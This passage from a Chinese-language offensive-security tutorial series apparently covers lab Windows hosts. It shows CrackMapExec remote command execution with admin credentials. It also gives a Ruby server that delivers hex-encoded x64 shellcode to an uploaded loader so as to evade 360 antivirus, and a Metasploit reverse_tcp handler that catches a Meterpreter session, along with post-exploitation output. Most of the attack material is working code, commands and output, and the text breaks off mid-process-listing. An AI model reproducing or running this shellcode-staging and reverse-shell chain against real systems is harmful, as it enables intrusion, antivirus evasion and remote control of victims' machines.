class="line">SMB 192.168.1.119 445 WIN03X64 Users membercount: 3</span><br></pre></td></tr></table></figure><p><img src="../do/media/4136be4626226c3dc06862d42b2ede35.jpg" alt></p><p>分别支持4种执行Command，如无–exec-method执行，默认为wmiexec执行。  </p><ul><li>mmcexec   </li><li>smbexec   </li><li>wmiexec   </li><li>atexec  </li></ul><p>基于smbexec执行Command</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐‐exec‐method smbexec ‐x &apos;net user&apos;</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Executed command via smbexec</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S \\ ���û��ʻ�</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S Administrator Guest</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S ����������ϣ�������һ����������</span><br></pre></td></tr></table></figure><p><img src="../do/media/751f7fd147dc4a1810d00aa1b5cde041.jpg" alt></p><p>基于dcom执行Command</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root\@John:\~\# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐‐exec‐method mmcexec ‐x &apos;whoami&apos;</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Executed command via mmcexec</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S win‐5bmi9hgc42s\administrator</span><br></pre></td></tr></table></figure><p><img src="../do/media/64443a4bd4d862023bcf82a0d8978c41.jpg" alt></p><p>基于wmi执行Command</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐‐exec‐method wmiexec ‐x &apos;whoami&apos;</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Executed command via wmiexec</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S win‐5bmi9hgc42s\administrator</span><br></pre></td></tr></table></figure><p><img src="../do/media/f97bf667d2f2bd316cefcb12550a4845.jpg" alt></p><p>基于AT执行Command</p><p>目标机：无运行calc进程<br><img src="../do/media/9dbb8af94a4ef3de96eb1476162a3a9d.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐‐exec‐method atexec ‐x &apos;calc&apos;</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Executed command via atexec</span><br></pre></td></tr></table></figure><p><img src="../do/media/7fdfdafcff3b66eebbcb49a359450a83.jpg" alt></p><p>默认采取wmiexec执行Command，参数为-x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐x &apos;whoami&apos;</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Executed command</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S win‐5bmi9hgc42s\administrator</span><br></pre></td></tr></table></figure><p><img src="../do/media/49adc1d483d3df2a5c12b432c61dc00d.jpg" alt></p><p>枚举目标机disk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cme smb 192.168.1.6 ‐u administrator ‐p &apos;123456&apos; ‐‐disks</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [*] Windows Web Server 2008 R2 760</span><br><span class="line">0 x64 (name:WIN‐5BMI9HGC42S) (domain:WIN‐5BMI9HGC42S) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] WIN‐</span><br><span class="line">5BMI9HGC42S\\administrator:123456 (Pwn3d!)</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S [+] Enumerated disks</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S C:</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S D:</span><br><span class="line">SMB 192.168.1.6 445 WIN‐5BMI9HGC42S E:</span><br></pre></td></tr></table></figure><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p><strong>解决出现：STATUS_PIPE_DISCONNECTED</strong><br><img src="../do/media/a7a5a32340bdb7651266594f5dd0dbc7.jpg" alt></p><p>改成经典</p><p><img src="../do/media/cbc0c19d3ddbc53c165d217f51289e5c.jpg" alt></p><p>解决出现错误：UnicodeDecodeError:</p><p>升级impacket  </p><p><img src="../do/media/f2f8fc124237c8317e634b28c6ff4212.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>92、实战中的Payload应用</title>
      <link href="/article/92_%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Payload%E5%BA%94%E7%94%A8.html"/>
      <url>/article/92_%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Payload%E5%BA%94%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.2 Windows 2008</p><p>目标机安装：360卫士+360杀毒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[*] 磁盘列表 [ C:D:E: ]</span><br><span class="line">C:\inetpub\wwwroot\&gt; tasklist </span><br><span class="line"></span><br><span class="line">映像名称 PID 会话名 会话\# 内存使用</span><br><span class="line"> ========================= ======== ================ =========== ============</span><br><span class="line"></span><br><span class="line">System Idle Process 0 0 24 K</span><br><span class="line">System 4 0 372 K</span><br><span class="line">smss.exe 236 0 956 K</span><br><span class="line">csrss.exe 324 0 5,572 K</span><br><span class="line">csrss.exe 364 1 14,452 K</span><br><span class="line">wininit.exe 372 0 4,508 K</span><br><span class="line">winlogon.exe 408 1 5,364 K</span><br><span class="line">services.exe 468 0 7,376 K</span><br><span class="line">lsass.exe 476 0 9,896 K</span><br><span class="line">lsm.exe 484 0 3,876 K</span><br><span class="line">svchost.exe 576 0 8,684 K</span><br><span class="line">vmacthlp.exe 632 0 3,784 K</span><br><span class="line">svchost.exe 676 0 7,384 K</span><br><span class="line">svchost.exe 764 0 12,716 K</span><br><span class="line">svchost.exe 800 0 29,792 K</span><br><span class="line">svchost.exe 848 0 11,248 K</span><br><span class="line">svchost.exe 900 0 9,308 K</span><br><span class="line">svchost.exe 940 0 16,184 K</span><br><span class="line">svchost.exe 332 0 11,800 K</span><br><span class="line">spoolsv.exe 548 0 15,568 K</span><br><span class="line">svchost.exe 1052 0 8,228 K</span><br><span class="line">svchost.exe 1076 0 8,808 K</span><br><span class="line">svchost.exe 1144 0 2,576 K</span><br><span class="line">VGAuthService.exe 1216 0 10,360 K</span><br><span class="line">vmtoolsd.exe 1300 0 18,068 K</span><br><span class="line">ManagementAgentHost.exe 1332 0 8,844 K</span><br><span class="line">svchost.exe 1368 0 11,884 K</span><br><span class="line">WmiPrvSE.exe 1768 0 13,016 K</span><br><span class="line">dllhost.exe 1848 0 11,224 K</span><br><span class="line">msdtc.exe 1940 0 7,736 K</span><br><span class="line">WmiPrvSE.exe 1440 0 19,768 K</span><br><span class="line">mscorsvw.exe 296 0 4,732 K</span><br><span class="line">mscorsvw.exe 584 0 5,088 K</span><br><span class="line">sppsvc.exe 1476 0 8,408 K</span><br><span class="line">taskhost.exe 2612 1 6,344 K</span><br><span class="line">dwm.exe 2868 1 4,604 K</span><br><span class="line">explorer.exe 2896 1 44,912 K</span><br><span class="line">vmtoolsd.exe 3008 1 17,744 K</span><br><span class="line">TrustedInstaller.exe 2268 0 15,776 K</span><br><span class="line">360Tray.exe 2684 1 6,056 K</span><br><span class="line">360sd.exe 2636 1 1,316 K</span><br><span class="line">ZhuDongFangYu.exe 2456 0 14,292 K</span><br><span class="line">360rp.exe 1712 1 27,072 K</span><br><span class="line">SoftMgrLite.exe 864 1 16,816 K</span><br><span class="line">w3wp.exe 3300 0 42,836 K</span><br><span class="line">svchost.exe 3840 0 4,584 K</span><br><span class="line">notepad.exe 3712 1 5,772 K</span><br><span class="line">cmd.exe 3384 0 2,376 K</span><br><span class="line">conhost.exe 3520 0 3,420 K</span><br><span class="line">tasklist.exe 3096 0 5,276 K 58</span><br></pre></td></tr></table></figure><p><img src="../do/media/571e651c57d719b8f3f5308c28709bf0.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; dir</span><br><span class="line">驱动器 C 中的卷没有标签。</span><br><span class="line">卷的序列号是 C6F8‐9BAB</span><br><span class="line"></span><br><span class="line">C:\ 的目录</span><br><span class="line">2017/12/13 03:28 &lt;DIR&gt; inetpub</span><br><span class="line">2009/07/14 11:20 &lt;DIR&gt; PerfLogs</span><br><span class="line">2017/12/13 03:28 &lt;DIR&gt; Program Files</span><br><span class="line">2019/01/23 14:09 &lt;DIR&gt; Program Files (x86)</span><br><span class="line">2019/01/23 14:15 &lt;DIR&gt; Users</span><br><span class="line">2017/12/13 03:25 &lt;DIR&gt; Windows</span><br><span class="line">0 个文件 0 字节</span><br><span class="line">6 个目录 21,387,132,928 可用字节</span><br></pre></td></tr></table></figure><p><img src="../do/media/cca6a60ee58ce571009ab193896b7baa.jpg" alt></p><h3 id="目标机位x64位-Windows-2008"><a href="#目标机位x64位-Windows-2008" class="headerlink" title="目标机位x64位 Windows 2008"></a>目标机位x64位 Windows 2008</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ver </span><br><span class="line">Microsoft Windows [版本 6.1.7600]</span><br></pre></td></tr></table></figure><p><img src="../do/media/4a16182f9ad9671797b1009dedbc44af.jpg" alt></p><h3 id="配置payload："><a href="#配置payload：" class="headerlink" title="配置payload："></a>配置payload：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@John<span class="symbol">:/var/www/html</span><span class="comment"># cat ./Micropoor_rev.rb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"><span class="keyword">if</span> ARGV.empty?</span><br><span class="line">  puts <span class="string">"Usage:"</span></span><br><span class="line">  puts <span class="string">"Micropoor.rb port"</span></span><br><span class="line">  exit</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line">PORT = ARGV.first.to_i </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(client)</span></span></span><br><span class="line">  puts <span class="string">"Payload is on‐line \#&#123;client&#125;"</span> </span><br><span class="line">  client.write(<span class="string">"4831c94881e9c0ffffff488d05efffffff48bb32667fcceeadb9f74</span></span><br><span class="line"><span class="string">8315827482df8ffffffe2f4ce2efc281e4575f732663e9daffdeba6642e4e1e8be532a552</span></span><br><span class="line"><span class="string">2ef49ef6e532a5122ef4bebee5b640782c32fd27e588379e5a1eb0ec8199b6f3af728def6</span></span><br><span class="line"><span class="string">c5b1a60272e8465ff997c705a37cd3ecb388f2a6d7dc36bdfb9f732edff44eeadb9bfb7a6</span></span><br><span class="line"><span class="string">0baba6ac69a7b92e678865ed99be33b69c9aa65270b6b952f784ef7bf4c6fb2e4e0c42ec7  </span></span><br><span class="line"><span class="string">83e3f277e0dd64dcc067e6533e8e6e8802647be278865ed9dbe33b6198d65a1f1b3b92663</span></span><br><span class="line"><span class="string">85ef7df87c36ee37cd3eece1b66a382696aff5f8ae733c374f028df8a5cd86278db7f7f17 </span></span><br><span class="line"><span class="string">c208f34331152e4be8c110cfeb19e8bf732272985674bf176dec67ecceee430127bda7dcc </span></span><br><span class="line"><span class="string">ee98795f33623e98a7245dbbbb973e76a2da9ff0cdb3334504c5b8f63266268d5484399c3  </span></span><br><span class="line"><span class="string">299aaa6e4ece7a7622b4e05a39c79bfcda637452ce546377aefbe8d5447b628d299aa8467 </span></span><br><span class="line"><span class="string">6ad3e7733e33450ce5300e73dce6699acc4622b7a60bc6a7527782d78eeccceeadf174de7 </span></span><br><span class="line"><span class="string">637450ce0883e58623e94a62440b68864a604b1526c74ca660199a62e7dd76cef89a6aeec </span></span><br><span class="line"><span class="string">e09f32767fccaff5f17ec02e4e05af17e15361838019a6247abebba132fd27e430077aefa</span></span><br><span class="line"><span class="string">5846754f84d30bfb79311783a0f321b5794affae09f32267fccaff5d3f76827c5c7c1a289  </span></span><br><span class="line"><span class="string">08e731268d54d8d7ba5399aa85116350cbcd998084ef6ef1def42efa3a9b19f808d53e15ccb7e47e35c2d3dd9a1178b9f7"</span>)</span><br><span class="line"></span><br><span class="line">  client.close</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line">socket = TCPServer.new(<span class="string">'0.0.0.0'</span>, PORT)</span><br><span class="line">puts <span class="string">"Listening on \#&#123;PORT&#125;. "</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> client = socket.accept</span><br><span class="line">  Thread.new &#123; handle_connection(client)&#125;</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line">root@John<span class="symbol">:/var/www/html</span><span class="comment"># ruby ./Micropoor_rev.rb 8080</span></span><br><span class="line"></span><br><span class="line">Listening on <span class="number">8080</span>.</span><br></pre></td></tr></table></figure><p><img src="../do/media/e7b69c4c0bb14566cc3b480dccc4a809.jpg" alt></p><h3 id="上传Micropoor-shellcode-x64-exe"><a href="#上传Micropoor-shellcode-x64-exe" class="headerlink" title="上传Micropoor_shellcode_x64.exe"></a>上传Micropoor_shellcode_x64.exe</h3><p><img src="../do/media/01ffba050adaf0936dc24796dab89b68.jpg" alt></p><h3 id="配置msf："><a href="#配置msf：" class="headerlink" title="配置msf："></a>配置msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line">LPORT 53 yes The listen port</span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/432b68991b56bfd1a2a240a7b2df7b7c.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><p><img src="../do/media/b70b9832e6637a1ce16f852decdfb53b.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.2</span><br><span class="line">[*] Meterpreter session 6 opened (192.168.1.4:53 ‐&gt; 192.168.1.2:49744)</span><br><span class="line">at 2019‐01‐23 01:29:00 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: IIS APPPOOL\DefaultAppPool</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : WIN‐5BMI9HGC42S</span><br><span class="line">OS : Windows 2008 R2 (Build 7600).</span><br><span class="line">Architecture : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain : WORKGROUP</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter : x64/windows</span><br><span class="line">meterpreter &gt; ipconfig </span><br><span class="line"></span><br><span class="line">Interface 1</span><br><span class="line">============ </span><br><span class="line">Name : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff </span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============ </span><br><span class="line">Name : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:bc:0d:5c</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 192.168.1.2</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5582:70c8:a5a8:8223</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p><img src="../do/media/330b9747574159497509b6c266f4ab95.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps </span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============ </span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">‐‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐</span><br><span class="line">0 0 [System Process]</span><br><span class="line">4 0 System</span><br><span class="line">236 4 smss.exe</span><br><span class="line">296 468 mscorsvw.exe</span><br><span class="line">324 316 csrss.exe</span><br><span class="line">332 468 svchost.exe</span><br><span class="line">364 356 csrss.exe</span><br><span class="line">372 316 wininit.exe</span><br><span class="line">408 356 winlogon.exe</span><br><span class="line">468 372 services.exe</span><br><span class="line">476 372 lsass.exe</span><br><span class="line">484 372 lsm.exe</span><br><span class="line">548 468 spoolsv.exe</span><br><span class="line">576 468 svchost.exe</span><br><span class="line">584 468 mscorsvw.exe</span><br><span class="line">632 468 vmacthlp.exe</span><br><span class="line">676 468 svchost.exe</span><br><span class="line">764 468 svchost.exe</span><br><span class="line">800 468 svchost.exe</span><br><span class="line">848 468 svchost.exe</span><br><span class="line">864 2684 SoftMgrLite.exe</span><br><span class="line">900 468 svchost.exe</span><br><span class="line">940 468 svchost.exe</span><br><span class="line">1052 468 svchost.exe</span><br><span class="line">1076 468 svchost.exe</span><br><span class="line">1144 468 svchost.exe</span><br><span class="line">1216 468 VGAuthService.exe</span><br><span class="line">1300 468 vmtoolsd.exe</span><br><span class="line">1332 468 ManagementAgentHost.exe</span><br><span class="line">1368 468 svchost.exe</span><br><span class="line">1440 576 WmiPrvSE.exe</span><br><span class="line">1476 468 sppsvc.exe</span><br><span class="line">1712 2636 360rp.exe</span><br><span class="line">1768 576 WmiPrvSE.exe</span><br><span class="line">1848 468 dllhost.exe</span><br><span class="line">1940 468 msdtc.exe</span><br><span class="line">2456 468 ZhuDongFangYu.exe</span><br><span class="line">2612 468 taskhost.exe</span><br><span class="line">2636 1096 360sd.exe</span><br><span class="line">2684 1096 360Tray.exe</span><br><span class="line">2788 3408 Micropoor_shellcode_x64.exe x64 0 IIS APPPOOL\DefaultAppPool C:\inetpub\wwwroot\Micropoor_shellcode_x64.exe</span><br><span class="line">2868 900 dwm.exe</span><br><span class="line">2896 2852 explorer.exe</span><br><span class="line">3008 2896 vmtoolsd.exe</span><br><span class="line">3196 468 svchost.exe</span><br><span class="line">3300 1368 w3wp.exe x64 0 IIS APPPOOL\DefaultAppPool c:\windows\system32\inetsrv\w3wp.exe</span><br><span class="line">3408 3300 cmd.exe x64 0 IIS APPPOOL\DefaultAppPool C:\Windows\system32\cmd.exe</span><br><span class="line">3712 2896 notepad.exe</span><br><span class="line">4092 324 conhost.exe x64 0 IIS APPPOOL\DefaultAppPool 